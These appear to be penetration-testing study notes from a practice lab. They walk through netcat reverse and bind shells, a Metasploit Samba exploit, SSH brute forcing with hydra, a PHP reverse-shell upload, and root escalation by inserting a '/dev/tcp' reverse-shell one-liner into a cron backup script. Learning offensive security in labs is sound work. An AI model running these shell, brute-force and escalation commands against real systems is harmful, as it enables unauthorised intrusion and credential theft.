

#### Types of Shell Connections:

- Reverse Shell:
	- A Reverse Shell is a process where the target connects to the attackbox/hacker's machine and establishes a shell connection
	- Reverse shell is performed used Netcat with below example syntax:
		- AttackBox/Hacker's machine: `nc -lvp 4444`
			- nc - netcat
			- -l - listen
			- -v - verbose
			- -p - port 
		- Target machine: `nc {ip-address} {port} -e /bin/sh` (Linux)
			- `nc {ip-address} {port} -e command.exe` (windows)
				- nc- netcat
				- -e - establish
- Bind Shell:
	- A Bind Shell is a process where the attacker/hacker machine connects to the target machine to the opened port
		- Bind shell is performed when there is a open port in target machine, which is opened by a exploit for example 4444 port
			- Target Machine: `nc -lvp 4444 -e /bin/sh`
			- Attacker Machine: `nc {ip-address} {port}`

#### Types of Payloads:

- Non-Staged Payload:
	- Sending exploit shellcode all at once
	- Larger in size and wont work always
		- Ex:
			- `windows/meterpreter_reverse_tcp`
- Staged Payload:
	- Sending payload in stages
	- Can be less stable
		- Ex:
			- `windows/meterpreter/reverse_tcp`


#### Gaining Root with Metasploit:

-  Just a demo exploit procedure to gain root shell access to a vulnerable machine through metasploit
	- Step-1:
		- Check which exploit is feasible for the machine, after gathering all the information in the reconnaissance and scanning phases, as for the example, we can use smb exploit to gain access to the machine
		- Start metasploit using
			- `msfconsole`
		- Search for the exploit (ex: trans2open)
			- `search trans2open`
		- Once you find the machine OS use that module from metasploit
			- `use 0/1/2/exploit/linux/samba/trans2open`
		- Once the exploit module is selected, use the options command to check for the target host and the payload options
			- `options`
		- Set the RHOST (Target machine {ip-address})
			- `set RHOSTS {ip-address}`
		- Set the payload as well, if we want to proceed with Staged Payload or Non-Staged Payload
			- `set payload linux/x86/shell_reverse_tcp`
		- Once all the options are set  as required, run the exploit using the exploit command:
			- `exploit`
		- Once the exploit is successful,  a shell connection will be established to the target machine and you can confirm the connection, by typing 'whoami


#### Brute Force Attack (SSH):

 - Brute force attack is trial and error to guess passwords, encryption keys, and other login credentials. As per below example, we will brute forcing SSH login to the vulnerable machine with 'hydra' and 'metasploit'
	- Syntax for **hydra**:
		- `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://{ip-address} -t 4 -V`
			- -l is for user
			- -P - this is for the wordlists path for the passwords
			- -t - threads count
			- -V - Verbose
	- **Metasploit** (msfconsole):
		- Step 1:
			- Search for ssh
				- `search ssh`
			- After finding the module in auxiliary section, use the module:
				- `use auxiliary/scanner/ssh/ssh_login`
			- Set the options as required:
				- `set USERNAME root`
				- `set RHOSTS {ip-address}`
				- `set PASS_FILE /usr/share/wordlists/metasploit/unix_passwords.txt`
				- `set THREADS 10`
				- `set VERBOSE True`
			- Once the options are set, run the module
				- `run`


#### Exploiting a Vulnerable Webserver:

- Web page is hosted in Apache server (Apache/2.4.38) and has a student academy website hosted with the URL: http://{ip-address}/academy
- After navigating the website, a upload button is observed in the student profile update page, to update the student's profile picture.
- As the upload functionality doesn't have any file format constrains, we are going to run an exploit using php to do a reverse shell connection.
	- https://github.com/pentestmonkey/php-reverse-shell
	- After getting the PHP exploit from above link for reverse shell, copy the exploit from github paste into a php file, into your local and update the ip-address in the exploit to the attacker's machine, so that the target machine to enable a reverse shell connection to the attacker's machine. we can change the port is required.
	- Once we have the file ready, before uploading the file, enable listening the attacker machine as ex:
		- `nc -nvlp 1234`
	- Once the attacker machine is listening, upload the exploit to the website and wait for the php exploit to run, once it ran, we can see that the port attacker machine is listening to, now have access to the target's shell.
- We are in the target machine, but we may not be a root user, to do privilege escalation, check on the privilege escalation section.


#### Privilege Escalation of a vulnerable target machine:

- After gaining access to the target machine, we are going to escalate our privilege to root, for that we will be using a tool called 'linpeas'
	- https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS
- This tool helps to check in linux machine to find a possibility for privilege escalation
- We copying the linpeas.sh file from the github, we will placing the file in a folder, easier to transfter the file to the target machine.
- Once we have the file, we will hosting a server in the folder, we have the file using python
	- `python3 -m http.server 80`
- Once we have server up, we can go back to the shell we have opened from target machine, navigate to the tmp folder use the command.
	- `wget http://{ip-address}/linpeas.sh`
	- This downloads the linpeas file to the target machine.
- Once we have the exploit code in the target machine, we need to make the file executable using the below command:
	- `chmod +x linpeas.sh`
- Once done, execute the file `./linpeas.sh`, this will provide a lot of information regarding the privilege escalation.
- After running, the PE exploit in the target machine, we observe that, we observed a sql username and password used in the phpmyadmin config file, which can be used to login to the database 
- We have observed, that we have a different user who has admin privileges using the `cat /etc/passwd`
- Using the SQL password, we received from the linpeas.sh exploit, we will try to ssh to the target machine with the newly found admin privileged user.
- After opening a SSH with the username and password we observed in the php config, we have observed that a backup script is running with the help of a cron job, with escalated privilege, so using the backup script, we will try to gain root access to the machine
- We have use `crontab -l` to check if there are any cron jobs running for the user
	- `crontab -u root -l` to check if any cron job running for the user provided 
- We can also check if there is any system dtimers and see if we have any script running for the backup
	- Using `systemctl list-timers`
- To check, all of the process running on the machine, we can use a tool called 'pspy', download it from github (https://github.com/DominicBreuker/pspy) and place it in the transfers folder of the attacker machine and same as earlier, go to the target's  ssh and go to the tmp and use the wget to grab the file using server running.
	- `wget http://{ip-address}/pspy64`
	- After that provide the execute permission with the chmod command.
		- `chmod +x pspy64`
		- Execute the file using `./pspy64`
	- This will show, all of the process running in the target machine and as thought we have a cron job running with escalated privilege, is executing the backup script
- We will be using this to our advantage, to gain root privileged access
	- We will be using  a BASH script one liner for the reverse shell from the cheat sheet (https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
	- We will be updating the one liner `bash -i >& /dev/tcp/{ip-address}/8081 0>&1` into the backup.sh script. {Ip-address} is attacker machine ip-address
	- We can give any port as required and once we have updated the script, in attacker machine, we will be listening for the port 8081, using the netcat command:
		- `nc -nvlp 8081`
	- Once the cron job runs the backup.sh script, we will be provided with shell access from the target machine with root privileged access using reverse shell exploit.
